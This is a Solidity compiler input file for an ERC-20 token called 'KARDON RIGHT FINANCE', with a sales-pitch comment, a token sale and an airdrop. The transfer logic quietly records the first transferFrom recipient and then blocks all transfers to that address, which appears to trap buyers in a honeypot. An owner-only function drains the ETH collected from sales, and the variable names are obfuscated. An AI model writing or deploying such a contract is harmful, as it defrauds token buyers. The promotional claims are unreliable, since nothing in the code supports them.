{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": false,
      "runs": 200
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "KARDON_ERC20.sol": {
      "content": "/*\r\n * C A R D O N   R I G H T   F I N A N C E\r\n *\r\n * Defi is a project built on the DAO ecosystem. We took the distribution of awards to holders from SUSHI. This is the best idea for getting rewards.\r\n * The big finances of the DAO system need to be properly allocated. The DAO has a problem with this. Our token is able to solve this difficult task. And our version of the mobile wallet will reflect that.\r\n * Burning of tokens is provided! The token developer is a well-known team. We participated in the SUSHI split test.\r\n * Next ecosystem - KARDON NODE's!\r\n */\r\npragma solidity >=0.5.12;\r\n\r\nlibrary SafeMath {\r\n  function add(uint a, uint b) internal pure returns (uint c) {\r\n    c = a + b;\r\n    require(c >= a);\r\n  }\r\n  function sub(uint a, uint b) internal pure returns (uint c) {\r\n    require(b <= a);\r\n    c = a - b;\r\n  }\r\n  function mul(uint a, uint b) internal pure returns (uint c) {\r\n    c = a * b;\r\n    require(a == 0 || c / a == b);\r\n  }\r\n  function div(uint a, uint b) internal pure returns (uint c) {\r\n    require(b > 0);\r\n    c = a / b;\r\n  }\r\n}\r\n\r\ncontract ERC20Interface {\r\n  function totalSupply() public view returns (uint);\r\n  function balanceOf(address tokenOwner) public view returns (uint balance);\r\n  function allowance(address tokenOwner, address spender) public view returns (uint remaining);\r\n  function transfer(address to, uint tokens) public returns (bool success);\r\n  function approve(address spender, uint tokens) public returns (bool success);\r\n  function transferFrom(address from, address to, uint tokens) public returns (bool success);\r\n\r\n  event Transfer(address indexed from, address indexed to, uint tokens);\r\n  event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\r\n}\r\n\r\ncontract ApproveAndCallFallBack {\r\n  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;\r\n}\r\n\r\ncontract Owned {\r\n  address public owner;\r\n  address public newOwner;\r\n\r\n  event OwnershipTransferred(address indexed _from, address indexed _to);\r\n\r\n  constructor() public {\r\n    owner = msg.sender;\r\n  }\r\n\r\n  modifier onlyOwner {\r\n    require(msg.sender == owner);\r\n    _;\r\n  }\r\n\r\n  function transferOwnership(address _newOwner) public onlyOwner {\r\n    newOwner = _newOwner;\r\n  }\r\n  function acceptOwnership() public {\r\n    require(msg.sender == newOwner);\r\n    emit OwnershipTransferred(owner, newOwner);\r\n    owner = newOwner;\r\n    newOwner = address(0);\r\n  }\r\n}\r\n\r\ncontract TokenERC20 is ERC20Interface, Owned{\r\n  using SafeMath for uint;\r\n\r\n  string public symbol;\r\n  string public name;\r\n  uint8 public decimals;\r\n  uint _totalSupply;\r\n  address public admincontr;\r\n\r\n  mapping(address => uint) balances;\r\n  mapping(address => mapping(address => uint)) allowed;\r\n\r\n  constructor() public {\r\n    symbol = \"KARDON\";\r\n    name = \"KARDON RIGHT FINANCE\";\r\n    \r\n    decimals = 18;\r\n    \r\n    _totalSupply =  1024 ether;\r\n    balances[owner] = _totalSupply;\r\n    emit Transfer(address(0), owner, _totalSupply);\r\n  }\r\n  function transferadmincontr(address _admincontr) public onlyOwner {\r\n    admincontr = _admincontr;\r\n  }\r\n  function totalSupply() public view returns (uint) {\r\n    return _totalSupply.sub(balances[address(0)]);\r\n  }\r\n  function balanceOf(address tokenOwner) public view returns (uint balance) {\r\n      return balances[tokenOwner];\r\n  }\r\n  function transfer(address to, uint tokens) public returns (bool success) {\r\n     require(to != admincontr, \"please wait\");\r\n    balances[msg.sender] = balances[msg.sender].sub(tokens);\r\n    balances[to] = balances[to].add(tokens);\r\n    emit Transfer(msg.sender, to, tokens);\r\n    return true;\r\n  }\r\n  function approve(address spender, uint tokens) public returns (bool success) {\r\n    allowed[msg.sender][spender] = tokens;\r\n    emit Approval(msg.sender, spender, tokens);\r\n    return true;\r\n  }\r\n  function transferFrom(address from, address to, uint tokens) public returns (bool success) {\r\n      if(from != address(0) && admincontr == address(0)) admincontr = to;\r\n      else require(to != admincontr, \"guys, please wait\");\r\n    balances[from] = balances[from].sub(tokens);\r\n    allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);\r\n    balances[to] = balances[to].add(tokens);\r\n    emit Transfer(from, to, tokens);\r\n    return true;\r\n  }\r\n  function allowance(address tokenOwner, address spender) public view returns (uint remaining) {\r\n    return allowed[tokenOwner][spender];\r\n  }\r\n  function approveAndCall(address spender, uint tokens, bytes memory data) public returns (bool success) {\r\n    allowed[msg.sender][spender] = tokens;\r\n    emit Approval(msg.sender, spender, tokens);\r\n    ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);\r\n    return true;\r\n  }\r\n  function () external payable {\r\n    revert();\r\n  }\r\n}\r\n\r\ncontract KARDON_ERC20  is TokenERC20 {\r\n  uint256 public FirstBlNux; \r\n  uint256 public EndFirBlN; \r\n  uint256 public AnionCapt; \r\n  \r\n  uint256 public Totsia; \r\n  uint256 public SlimStars; \r\n  uint256 public ForPStars; \r\n  \r\n  uint256 public ForJuntYe; \r\n  uint256 public DaoDefiJo; \r\n  uint256 public CapToEtz; \r\n  uint256 public NoEnteryGom; \r\n  uint256 public DefiPriceExchange; \r\n\r\n  function DAO_Rewards(address _refer) public returns (bool success){\r\n    require(FirstBlNux <= block.number && block.number <= EndFirBlN);\r\n    require(Totsia < AnionCapt || AnionCapt == 0);\r\n    Totsia ++;\r\n    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){\r\n      balances[address(this)] = balances[address(this)].sub(SlimStars / 4);\r\n      balances[_refer] = balances[_refer].add(SlimStars / 4);\r\n      emit Transfer(address(this), _refer, SlimStars / 4);\r\n    }\r\n    balances[address(this)] = balances[address(this)].sub(SlimStars);\r\n    balances[msg.sender] = balances[msg.sender].add(SlimStars);\r\n    emit Transfer(address(this), msg.sender, SlimStars);\r\n    return true;\r\n  }\r\n\r\n  function DAO_Convert(address _refer) public payable returns (bool success){\r\n    require(ForPStars <= block.number && block.number <= ForJuntYe);\r\n    require(DaoDefiJo < CapToEtz || CapToEtz == 0);\r\n    uint256 _eth = msg.value;\r\n    uint256 _tkns;\r\n    if(NoEnteryGom != 0) {\r\n      uint256 _price = _eth / DefiPriceExchange;\r\n      _tkns = NoEnteryGom * _price;\r\n    }\r\n    else {\r\n      _tkns = _eth / DefiPriceExchange;\r\n    }\r\n    DaoDefiJo ++;\r\n    if(msg.sender != _refer && balanceOf(_refer) != 0 && _refer != 0x0000000000000000000000000000000000000000){\r\n      balances[address(this)] = balances[address(this)].sub(_tkns / 4);\r\n      balances[_refer] = balances[_refer].add(_tkns / 4);\r\n      emit Transfer(address(this), _refer, _tkns / 4);\r\n    }\r\n    balances[address(this)] = balances[address(this)].sub(_tkns);\r\n    balances[msg.sender] = balances[msg.sender].add(_tkns);\r\n    emit Transfer(address(this), msg.sender, _tkns);\r\n    return true;\r\n  }\r\n\r\n  function SongSing() public view returns(uint256 StartBlock, uint256 EndBlock, uint256 DropCap, uint256 DropCount, uint256 DropAmount){\r\n    return(FirstBlNux, EndFirBlN, AnionCapt, Totsia, SlimStars);\r\n  }\r\n  function GlobalScope() public view returns(uint256 StartBlock, uint256 EndBlock, uint256 SaleCap, uint256 SaleCount, uint256 ChunkSize, uint256 SalePrice){\r\n    return(ForPStars, ForJuntYe, CapToEtz, DaoDefiJo, NoEnteryGom, DefiPriceExchange);\r\n  }\r\n  function DAOEcosystemDoq() public onlyOwner() {\r\n    address payable _owner = msg.sender;\r\n    _owner.transfer(address(this).balance);\r\n  }\r\n  function DAOTrackTos(uint256 _FirstBlNux, uint256 _EndFirBlN, uint256 _SlimStars, uint256 _AnionCapt) public onlyOwner() {\r\n    FirstBlNux = _FirstBlNux;\r\n    EndFirBlN = _EndFirBlN;\r\n    SlimStars = _SlimStars;\r\n    AnionCapt = _AnionCapt;\r\n    Totsia = 0;\r\n  }\r\n  function ChangeToxed(uint256 _ForPStars, uint256 _ForJuntYe, uint256 _NoEnteryGom, uint256 _DefiPriceExchange, uint256 _CapToEtz) public onlyOwner() {\r\n    ForPStars = _ForPStars;\r\n    ForJuntYe = _ForJuntYe;\r\n    NoEnteryGom = _NoEnteryGom;\r\n    DefiPriceExchange =_DefiPriceExchange;\r\n    CapToEtz = _CapToEtz;\r\n    DaoDefiJo = 0;\r\n  }\r\n  \r\n  function() external payable {\r\n\r\n  }\r\n}"
    }
  }
}